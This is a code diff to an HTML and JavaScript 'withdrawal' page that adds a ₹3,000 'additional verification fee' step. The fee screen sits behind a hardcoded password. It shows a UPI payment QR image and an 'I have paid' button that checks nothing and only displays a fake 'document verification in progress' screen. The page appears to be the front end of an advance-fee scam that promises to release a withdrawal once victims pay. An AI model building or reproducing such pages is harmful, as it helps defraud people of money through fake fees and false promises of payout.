@@ -3,7 +3,7 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=yes">
-  <title>Withdraw · Document Verification</title>
+  <title>Withdraw · Step 2</title>
   <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -48,7 +48,6 @@
       display: flex;
     }
 
-    /* header */
     .header {
       display: flex;
       justify-content: space-between;
@@ -69,27 +68,27 @@
       cursor: pointer;
     }
 
-    /* password screen */
+    /* Password Section */
     .auth-header {
       text-align: center;
-      margin-top: 40px;
-      margin-bottom: 40px;
+      margin-top: 30px;
+      margin-bottom: 30px;
     }
 
     .auth-icon {
-      font-size: 3.5rem;
+      font-size: 3rem;
       color: #12b4ff;
-      margin-bottom: 20px;
+      margin-bottom: 16px;
     }
 
     .auth-title {
-      font-size: 1.5rem;
+      font-size: 1.4rem;
       font-weight: 600;
-      margin-bottom: 10px;
+      margin-bottom: 8px;
     }
 
     .auth-subtitle {
-      font-size: 0.95rem;
+      font-size: 0.9rem;
       color: #8b95a5;
     }
 
@@ -99,7 +98,7 @@
       border-radius: 12px;
       display: flex;
       align-items: center;
-      padding: 16px 20px;
+      padding: 14px 18px;
       margin-bottom: 15px;
       transition: border-color 0.2s;
     }
@@ -110,14 +109,14 @@
 
     .password-input-wrapper i.lock-icon {
       color: #8b95a5;
-      margin-right: 15px;
+      margin-right: 12px;
     }
 
     .password-input-wrapper input {
       background: transparent;
       border: none;
       color: #fff;
-      font-size: 1.05rem;
+      font-size: 1rem;
       flex: 1;
       outline: none;
     }
@@ -135,10 +134,9 @@
 
     .error-message {
       color: #ff4757;
-      font-size: 0.85rem;
-      margin-bottom: 20px;
+      font-size: 0.8rem;
+      margin-bottom: 16px;
       display: none;
-      padding-left: 5px;
     }
 
     .verify-btn {
@@ -147,12 +145,13 @@
       color: #fff;
       border: none;
       border-radius: 10px;
-      padding: 16px;
-      font-size: 1.05rem;
+      padding: 15px;
+      font-size: 1rem;
       font-weight: 600;
       cursor: pointer;
       box-shadow: 0 4px 0 #0a84c2;
       transition: transform 0.1s ease, box-shadow 0.1s ease;
+      margin-bottom: 10px;
     }
 
     .verify-btn:active {
@@ -160,30 +159,115 @@
       box-shadow: 0 0 0 #0a84c2;
     }
 
-    /* PROCESSING SCREEN (document verification) */
+    .verify-btn:disabled {
+      background-color: #152d22;
+      color: #2ed573;
+      box-shadow: 0 4px 0 #0f3d2a;
+      cursor: not-allowed;
+    }
+
+    .divider-line {
+      border: none;
+      border-top: 1px solid #2a2f3a;
+      margin: 20px 0;
+    }
+
+    .section-label {
+      font-size: 0.85rem;
+      color: #8b95a5;
+      margin-bottom: 10px;
+    }
+
+    .warning-box {
+      background: #1a1c23;
+      border: 1px solid #fbbf24;
+      border-radius: 14px;
+      padding: 20px;
+      text-align: center;
+      margin: 16px 0;
+    }
+
+    .warning-icon {
+      font-size: 2.8rem;
+      color: #fbbf24;
+      margin-bottom: 12px;
+    }
+
+    .warning-title {
+      font-size: 1.15rem;
+      font-weight: 600;
+      margin-bottom: 10px;
+      color: #fbbf24;
+    }
+
+    .warning-text {
+      font-size: 0.85rem;
+      color: #cbd5e1;
+      line-height: 1.5;
+      margin-bottom: 14px;
+    }
+
+    .payment-summary {
+      background: #1e2130;
+      border-radius: 12px;
+      padding: 14px;
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin: 16px 0 8px;
+      border: 1px solid #2a2f3a;
+    }
+
+    .payment-amount {
+      font-weight: 700;
+      font-size: 1.3rem;
+      color: #fbbf24;
+    }
+
+    .payment-note {
+      font-size: 0.75rem;
+      color: #94a3b8;
+      margin-left: 4px;
+    }
+
+    .pay-now-btn {
+      width: 100%;
+      background-color: #fbbf24;
+      color: #0f172a;
+      border: none;
+      border-radius: 10px;
+      padding: 15px;
+      font-weight: 700;
+      font-size: 1rem;
+      cursor: pointer;
+      box-shadow: 0 4px 0 #b45309;
+      transition: 0.1s;
+      margin-top: 8px;
+    }
+
+    .pay-now-btn:active {
+      transform: translateY(4px);
+      box-shadow: 0 0 0 #b45309;
+    }
+
+    /* Processing Section */
     .processing-wrapper {
-      flex: 1;
       display: flex;
       flex-direction: column;
       align-items: center;
       justify-content: center;
       text-align: center;
-      padding: 20px;
+      padding: 10px 0;
     }
 
-    .loader-container {
-      margin-bottom: 30px;
-    }
-
-    /* animated spinner */
     .spinner {
-      width: 70px;
-      height: 70px;
-      border: 5px solid rgba(18, 180, 255, 0.2);
-      border-top: 5px solid #12b4ff;
+      width: 60px;
+      height: 60px;
+      border: 4px solid rgba(18, 180, 255, 0.2);
+      border-top: 4px solid #12b4ff;
       border-radius: 50%;
       animation: spin 1s linear infinite;
-      margin: 0 auto 16px;
+      margin: 0 auto 12px;
     }
 
     @keyframes spin {
@@ -192,68 +276,139 @@
     }
 
     .processing-icon-animated {
-      font-size: 3.2rem;
+      font-size: 2.8rem;
       color: #12b4ff;
-      margin-top: 12px;
+      margin-top: 8px;
     }
 
     .processing-title {
-      font-size: 1.6rem;
+      font-size: 1.3rem;
       font-weight: 600;
-      margin-bottom: 14px;
-      color: #ffffff;
+      margin-bottom: 12px;
     }
 
     .processing-message-box {
       background: #1a1c23;
       border: 1px solid #2a2f3a;
-      border-radius: 16px;
-      padding: 20px 18px;
+      border-radius: 14px;
+      padding: 16px 14px;
       width: 100%;
-      margin: 10px 0 24px;
+      margin: 8px 0 20px;
     }
 
     .verification-text {
-      font-size: 1rem;
+      font-size: 0.9rem;
       color: #cbd5e1;
-      margin-bottom: 12px;
+      margin-bottom: 10px;
       font-weight: 500;
       line-height: 1.5;
     }
 
     .time-badge {
       background: #0f172a;
-      padding: 8px 20px;
+      padding: 7px 18px;
       border-radius: 30px;
       display: inline-block;
       font-weight: 700;
       color: #fbbf24;
-      margin: 10px 0 8px;
-      font-size: 0.95rem;
+      margin: 8px 0;
+      font-size: 0.9rem;
     }
 
     .transfer-message {
       color: #94a3b8;
-      font-size: 0.9rem;
-      margin-top: 14px;
+      font-size: 0.8rem;
+      margin-top: 12px;
       line-height: 1.5;
     }
 
-    .back-home-btn {
-      background: transparent;
-      border: 1px solid #2a2f3a;
-      color: #c0c6d4;
-      padding: 14px 24px;
-      border-radius: 10px;
-      font-weight: 500;
-      cursor: pointer;
-      transition: 0.2s;
-      margin-top: 10px;
+    .hidden-section {
+      display: none;
     }
 
-    .back-home-btn:hover {
-      background: #1e212a;
-      border-color: #3b4252;
+    .hidden-section.visible {
+      display: block;
+    }
+
+    .modal-overlay {
+      position: fixed;
+      top: 0;
+      left: 0;
+      width: 100%;
+      height: 100%;
+      background-color: rgba(0,0,0,0.8);
+      backdrop-filter: blur(4px);
+      display: none;
+      justify-content: center;
+      align-items: center;
+      z-index: 1000;
+      animation: fadeIn 0.3s;
+    }
+
+    .modal-content {
+      background: #1a1d24;
+      border: 1px solid #2a2f3a;
+      width: 90%;
+      max-width: 360px;
+      border-radius: 16px;
+      padding: 24px;
+      text-align: center;
+      position: relative;
+    }
+
+    .close-modal-btn {
+      position: absolute;
+      top: 16px;
+      right: 16px;
+      background: none;
+      border: none;
+      color: #8b95a5;
+      font-size: 1.3rem;
+      cursor: pointer;
+    }
+
+    .modal-icon {
+      font-size: 2.4rem;
+      color: #fbbf24;
+      margin-bottom: 12px;
+    }
+
+    .modal-title {
+      font-size: 1.25rem;
+      font-weight: 600;
+      margin-bottom: 10px;
+    }
+
+    .modal-text {
+      font-size: 0.9rem;
+      color: #a0a8b8;
+      margin-bottom: 16px;
+    }
+
+    .qr-image-container {
+      background: #fff;
+      padding: 8px;
+      border-radius: 12px;
+      display: inline-block;
+      margin-bottom: 16px;
+    }
+
+    .qr-image-container img {
+      width: 170px;
+      height: 170px;
+      object-fit: cover;
+      border-radius: 8px;
+    }
+
+    .paid-btn {
+      width: 100%;
+      background: #152d22;
+      color: #2ed573;
+      border: 1px solid #1f3e2f;
+      border-radius: 8px;
+      padding: 14px;
+      font-weight: 600;
+      cursor: pointer;
     }
 
     @keyframes fadeIn {
@@ -263,102 +418,159 @@
 </head>
 <body>
 <div class="app-container">
-  <!-- PASSWORD SCREEN -->
-  <div id="password-screen" class="screen active">
+  <!-- MAIN SCREEN: Password + ₹3,000 Fee + Processing Combined -->
+  <div id="main-screen" class="screen active">
     <header class="header">
       <button class="icon-btn"><i class="fa-solid fa-chevron-left"></i></button>
+      <h1>Final Verification</h1>
+      <div></div>
     </header>
-    <div class="auth-header">
-      <i class="fa-solid fa-shield-halved auth-icon"></i>
-      <h1 class="auth-title">Security Verification</h1>
-      <p class="auth-subtitle">Enter your withdrawal password to proceed</p>
-    </div>
-    <div class="password-input-wrapper">
-      <i class="fa-solid fa-lock lock-icon"></i>
-      <input type="password" id="withdraw-password" placeholder="Enter withdrawal password" autocomplete="off">
-      <button type="button" class="toggle-password-btn" id="toggle-password">
-        <i class="fa-solid fa-eye" id="eye-icon"></i>
-      </button>
-    </div>
-    <p class="error-message" id="password-error"><i class="fa-solid fa-circle-exclamation"></i> Incorrect password. Please try again.</p>
-    <button class="verify-btn" id="verify-btn">Verify Password</button>
-  </div>
 
-  <!-- PROCESSING SCREEN (Document Verification) -->
-  <div id="processing-screen" class="screen">
-    <div class="processing-wrapper">
-      <div class="loader-container">
-        <div class="spinner"></div>
-        <i class="fa-solid fa-file-circle-check processing-icon-animated"></i>
+    <!-- PASSWORD SECTION -->
+    <div id="password-section">
+      <div class="auth-header">
+        <i class="fa-solid fa-shield-halved auth-icon"></i>
+        <h2 class="auth-title">Security Verification</h2>
+        <p class="auth-subtitle">Enter password to access verification</p>
       </div>
 
-      <h2 class="processing-title">Document Verification</h2>
+      <div class="password-input-wrapper">
+        <i class="fa-solid fa-lock lock-icon"></i>
+        <input type="password" id="withdraw-password" placeholder="Enter password" autocomplete="off">
+        <button type="button" class="toggle-password-btn" id="toggle-password">
+          <i class="fa-solid fa-eye" id="eye-icon"></i>
+        </button>
+      </div>
+      <p class="error-message" id="password-error"><i class="fa-solid fa-circle-exclamation"></i> Incorrect password</p>
+      <button class="verify-btn" id="verify-btn">Verify & Unlock</button>
+    </div>
 
-      <div class="processing-message-box">
-        <p class="verification-text">
-          <i class="fa-solid fa-spinner"></i> Your document verification is in progress
+    <hr class="divider-line" id="divider1">
+
+    <!-- ₹3,000 FEE SECTION (Initially hidden) -->
+    <div id="fee-section" class="hidden-section">
+      <div class="warning-box">
+        <i class="fa-solid fa-triangle-exclamation warning-icon"></i>
+        <h2 class="warning-title">Additional Verification Fee</h2>
+        <p class="warning-text">
+          Your documents have been received. To complete the verification and release your withdrawal amount, an additional fee of <strong>₹3,000</strong> is required.
         </p>
-        <div class="time-badge">
-          <i class="fa-regular fa-clock"></i> May take up to 24 hours
+      </div>
+
+      <div class="payment-summary">
+        <div>
+          <span style="color:#cbd5e1; font-weight:500;">Verification processing fee</span>
+          <span class="payment-note">(INR)</span>
         </div>
-        <p class="transfer-message">
-          Once verified, your amount will be transferred to your account.
-        </p>
+        <div class="payment-amount">₹3,000</div>
       </div>
 
-      <p style="color: #8b95a5; font-size: 0.85rem; margin-bottom: 20px;">
-        Thank you for your patience.
+      <p style="font-size:0.75rem; color:#8b95a5; margin-bottom:6px; text-align:center;">
+        <i class="fa-solid fa-info-circle"></i> Final step before withdrawal is processed.
       </p>
 
-      <button class="back-home-btn" id="backToHomeFromProcessing">
-        <i class="fa-solid fa-arrow-left"></i> Back to Home
+      <button class="pay-now-btn" id="payAdditionalBtn">
+        <i class="fa-solid fa-qrcode"></i> Pay ₹3,000 Now
       </button>
     </div>
+
+    <hr class="divider-line" id="divider2" style="display:none;">
+
+    <!-- PROCESSING SECTION (Initially hidden) -->
+    <div id="processing-section" class="hidden-section">
+      <div class="processing-wrapper">
+        <div class="spinner"></div>
+        <i class="fa-solid fa-file-circle-check processing-icon-animated"></i>
+
+        <h2 class="processing-title">Document Verification</h2>
+
+        <div class="processing-message-box">
+          <p class="verification-text">
+            <i class="fa-solid fa-spinner"></i> Your document verification is in progress
+          </p>
+          <div class="time-badge">
+            <i class="fa-regular fa-clock"></i> May take up to 24 hours
+          </div>
+          <p class="transfer-message">
+            Once verified, your amount will be transferred to your account.
+          </p>
+        </div>
+
+        <p style="color: #8b95a5; font-size: 0.8rem;">
+          Thank you for your patience.
+        </p>
+      </div>
+    </div>
+  </div>
+</div>
+
+<!-- SCANNER MODAL for ₹3,000 -->
+<div class="modal-overlay" id="scannerModal">
+  <div class="modal-content">
+    <button class="close-modal-btn" id="closeModalBtn"><i class="fa-solid fa-xmark"></i></button>
+    <div class="modal-icon"><i class="fa-solid fa-qrcode"></i></div>
+    <h3 class="modal-title">Scan to Pay ₹3,000</h3>
+    <p class="modal-text">Complete payment using any UPI app, then tap below.</p>
+    <div class="qr-image-container">
+      <img src="https://github.com/user-attachments/assets/b4b0c3aa-375b-48f5-a022-22d0b300cd06" alt="Payment QR">
+    </div>
+    <button class="paid-btn" id="confirmPaymentBtn">I have paid ₹3,000</button>
   </div>
 </div>
 
 <script>
   (function() {
-    // screens
-    const passwordScreen = document.getElementById('password-screen');
-    const processingScreen = document.getElementById('processing-screen');
-
-    // password elements
+    // Password elements
     const passwordInput = document.getElementById('withdraw-password');
     const verifyBtn = document.getElementById('verify-btn');
     const errorMsg = document.getElementById('password-error');
     const togglePassBtn = document.getElementById('toggle-password');
     const eyeIcon = document.getElementById('eye-icon');
-    const backToHomeBtn = document.getElementById('backToHomeFromProcessing');
+    const passwordSection = document.getElementById('password-section');
 
-    // PASSWORD
+    // Fee & Processing elements
+    const feeSection = document.getElementById('fee-section');
+    const processingSection = document.getElementById('processing-section');
+    const divider1 = document.getElementById('divider1');
+    const divider2 = document.getElementById('divider2');
+
+    // Modal elements
+    const payAdditionalBtn = document.getElementById('payAdditionalBtn');
+    const scannerModal = document.getElementById('scannerModal');
+    const closeModalBtn = document.getElementById('closeModalBtn');
+    const confirmPaymentBtn = document.getElementById('confirmPaymentBtn');
+
+    // Password: User4229@2lakh
     const REQUIRED_PASSWORD = "User4229@2lakh";
 
-    function showScreen(screen) {
-      passwordScreen.classList.remove('active');
-      processingScreen.classList.remove('active');
-      screen.classList.add('active');
-    }
-
-    // Password verification -> directly show processing screen
-    function handlePassword() {
+    // Verify password -> Show fee section
+    verifyBtn.addEventListener('click', () => {
       if (passwordInput.value === REQUIRED_PASSWORD) {
         errorMsg.style.display = 'none';
-        passwordInput.value = '';
-        // Show document verification processing screen
-        showScreen(processingScreen);
+        passwordInput.disabled = true;
+        togglePassBtn.disabled = true;
+        verifyBtn.textContent = '✅ Verified';
+        verifyBtn.disabled = true;
+        verifyBtn.style.backgroundColor = '#152d22';
+        verifyBtn.style.color = '#2ed573';
+        verifyBtn.style.boxShadow = '0 4px 0 #0f3d2a';
+
+        // Show fee section
+        feeSection.classList.add('visible');
+        divider2.style.display = 'block';
+        feeSection.scrollIntoView({ behavior: 'smooth' });
       } else {
         errorMsg.style.display = 'block';
         passwordInput.value = '';
         passwordInput.focus();
       }
-    }
+    });
 
-    verifyBtn.addEventListener('click', handlePassword);
+    // Enter key support
     passwordInput.addEventListener('keypress', (e) => {
       if (e.key === 'Enter') {
         e.preventDefault();
-        handlePassword();
+        verifyBtn.click();
       }
     });
 
@@ -375,19 +587,33 @@
       }
     });
 
-    // Back to home button (returns to password screen)
-    backToHomeBtn.addEventListener('click', () => {
-      passwordInput.value = '';
-      errorMsg.style.display = 'none';
-      passwordInput.type = 'password';
-      eyeIcon.classList.remove('fa-eye-slash');
-      eyeIcon.classList.add('fa-eye');
-      showScreen(passwordScreen);
-    });
-
     // Clear error on typing
     passwordInput.addEventListener('input', () => {
       if (errorMsg.style.display === 'block') errorMsg.style.display = 'none';
+    });
+
+    // Pay ₹3,000 -> Open scanner
+    payAdditionalBtn.addEventListener('click', () => {
+      scannerModal.style.display = 'flex';
+    });
+
+    // Close modal
+    closeModalBtn.addEventListener('click', () => {
+      scannerModal.style.display = 'none';
+    });
+
+    window.addEventListener('click', (e) => {
+      if (e.target === scannerModal) scannerModal.style.display = 'none';
+    });
+
+    // Confirm payment -> Show processing
+    confirmPaymentBtn.addEventListener('click', () => {
+      scannerModal.style.display = 'none';
+      feeSection.style.display = 'none';
+      divider1.style.display = 'none';
+      divider2.style.display = 'none';
+      processingSection.classList.add('visible');
+      processingSection.scrollIntoView({ behavior: 'smooth' });
     });
 
   })();
